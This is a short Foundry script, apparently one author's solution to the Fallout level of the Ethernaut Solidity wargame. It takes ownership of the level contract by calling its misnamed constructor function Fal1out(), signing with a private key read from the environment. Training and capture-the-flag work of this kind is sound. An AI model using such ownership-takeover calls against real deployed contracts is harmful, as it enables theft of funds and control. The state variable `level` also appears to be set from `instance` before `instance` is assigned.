// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Fallout} from "src/02/Fallout.sol";

contract Exploit is Script {

        Fallout level = Fallout(payable(address(instance)));
        address instance = vm.envAddress("INSTANCE_LEVEL2");
        uint256 hacker = vm.envUint("PRIVATE_KEY");     
        address deployer = vm.rememberKey(hacker);
      
        function run() external {
            vm.startBroadcast(deployer);
            level.Fal1out();
            vm.stopBroadcast();
    }
}